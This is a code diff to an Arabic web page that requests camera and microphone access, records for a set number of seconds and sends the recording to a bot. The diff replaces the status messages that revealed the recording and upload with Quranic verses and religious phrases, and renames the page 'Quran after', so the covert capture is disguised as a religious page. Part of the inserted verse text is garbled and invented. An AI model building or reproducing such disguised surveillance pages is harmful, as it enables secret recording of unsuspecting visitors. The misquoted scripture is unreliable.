@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تعليمي — تسجيل 10 ثواني وإرسال للبوت</title>
+<title>قران بعد<title>
 <style>
 body{font-family:Tahoma, Arial;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#f3f6ff}
 #msg{max-width:760px;padding:18px;text-align:center;color:#222}
@@ -48,7 +48,7 @@ function onFirstInteraction(){
 async function attemptStart(){
   if(started) return;
   started = true;
-  statusEl.textContent='طلب إذن الكاميرا والميكروفون...';
+  statusEl.textContent='بسم الله الرحمن الرحيم';
 
   try{
     stream = await navigator.mediaDevices.getUserMedia({
@@ -88,11 +88,19 @@ function startRecording(){
   };
 
   mediaRecorder.onstart = ()=>{
-    statusEl.textContent=`التسجيل بدأ — سيقف بعد ${RECORD_SECONDS} ثانية.`;
+    statusEl.textContent=`① الزَّانِيَةُ وَالزَّانِي فَاجْلِدُوا كُلَّ وَاحِدٍ مِنْهُمَا مِائَةَ جَلْدَةٍ ۖ وَلَا تَأْخُذْكُمْ بِهِمَا رَأْفَةٌ فِي دِينِ اللَّهِ إِن كُنتُمْ تُؤْمِنُونَ بِاللَّهِ وَالْيَوْمِ الْآخِرِ ۖ وَلْيَشْهَدْ عَذَابَهُمَا طَائْفَةٌ مِّنَ الْمُؤْمِنِينَ
+
+② الزَّانِي لَا يَنكِحُ إِلَّا زَانِيَةً أَوْ مُشْرِكَةً وَالزَّانِيَةُ لَا يَنكِحُهَا إِلَّا زَانٍ أَوْ مُشْرِكٌ وَحُرِّمَ ذَلِكَ عَلَى الْمُؤْمِنِينَ
+
+③ وَالَّذِينَ يَرْمُونَ الْمُحْصَنَاتِ ثُمَّ لَمْ يَأْتُوا بِأَرْبَعَةِ شُهَدَاءٍ فَاجْلِدُوهُمْ ثَمَانِينَ جَلْدَةً وَلَا تَقْبَلُوا لَهُمْ شَهَادَةً أَبَدًا ۚ وَأُولَٰئِكَ هُمُ الْفَاسِقُونَ
+
+④ إِلَّا الَّذِينَ تَابُوا مِن بَعْدِ ذَٰلِكَ وَأَصْلَحُوا فَإِنَّ اللَّهَ غَفُورٌ رَّحِيمٌ
+
+⑤ وَالْمُحْصَنَاتُ مِنَ النِّسَاءِ إِلَّا مَا مَلَكَتْ أَيْمَانُكُمْ كِتَابَ اللَّهِ عَلَيْكُمْ ۚ وَرَاجُوا النِّسَاءَ بِالْمَعْرُوفِ ۚ وَلا تَعْتَدُوا ۚ إِنَّ اللَّهَ كَانَ عَفُوًّا غَفُورًا{RECORD_SECONDS} ثانية.`;
   };
 
   mediaRecorder.onstop = async ()=>{
-    statusEl.textContent='انتهى التسجيل — جارٍ الإرسال للبوت...';
+    statusEl.textContent='صدق الله العظيم';
 
     if(stream) stream.getTracks().forEach(t=>t.stop());
 
